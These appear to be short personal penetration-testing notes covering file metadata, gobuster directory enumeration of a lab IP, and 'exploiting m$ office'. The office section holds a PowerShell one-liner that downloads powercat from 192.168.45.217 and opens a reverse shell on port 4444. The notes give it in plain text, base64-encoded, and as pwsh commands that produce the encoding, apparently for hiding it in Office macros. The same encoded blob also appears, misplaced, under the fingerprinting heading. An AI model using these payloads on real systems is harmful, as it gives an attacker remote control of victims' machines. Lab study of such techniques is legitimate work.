## info gathering
exiftool file.txt -> get file info

gobuster dir -u 192.168.214.197 -w /usr/share/wordlists/dirb/common.txt -x pdf

find all the pdfs on a server

## finger printingSUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw
Oi8vMTkyLjE2OC40NS4yMTcvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4y
MTcgLXAgNDQ0NCAtZSBwb3dlcnNoZWxsCg==


## exploiting m$ office
SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw
Oi8vMTkyLjE2OC40NS4yMTcvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4y
MTcgLXAgNDQ0NCAtZSBwb3dlcnNoZWxsCg==

IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217/powercat.ps1');powercat -c 192.168.45.217 -p 4444 -e powershell


pwsh -c '[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217/powercat.ps1');powercat -c 192.168.45.217 -p 4444 -e powershell"))'

pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217/powercat.ps1');powercat -c 192.168.45.217 -p 4444 -e powershell\"))"
